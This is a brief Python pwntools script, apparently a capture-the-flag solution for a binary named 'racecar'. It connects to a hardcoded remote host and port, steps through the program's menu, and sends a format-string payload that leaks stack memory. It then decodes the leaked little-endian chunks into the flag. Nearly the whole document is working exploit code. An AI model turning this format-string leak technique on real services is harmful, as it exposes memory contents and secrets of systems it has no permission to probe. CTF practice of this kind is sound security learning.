from pwn import *

HOST = "165.227.232.214"
PORT = 31027
context.binary = elf = ELF("./racecar")
io = remote(HOST, PORT)

io.sendlineafter(b'Name: ', b'hacker')
io.sendlineafter(b'Nickname: ', b'hacker')
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'> ', b'2')
io.recv()
io.sendlineafter(b'> ', b'%12$x-%13$x-%14$x-%15$x-%16$x-%17$x-%18$x-%19$x-%20$x-%21$x-%22$x')

io.interactive()
io.close()
# {BTH_yhw_d1d4s_1t_3vf_3h_g4lt_n05_3hkc4t}!?
flag = "{BTH_yhw_d1d4s_1t_3vf_3h_g4lt_n05_3hkc4t}!?"
flag = "".join(flag[i:i+4][::-1] for i in range(0, len(flag), 4))
print(flag)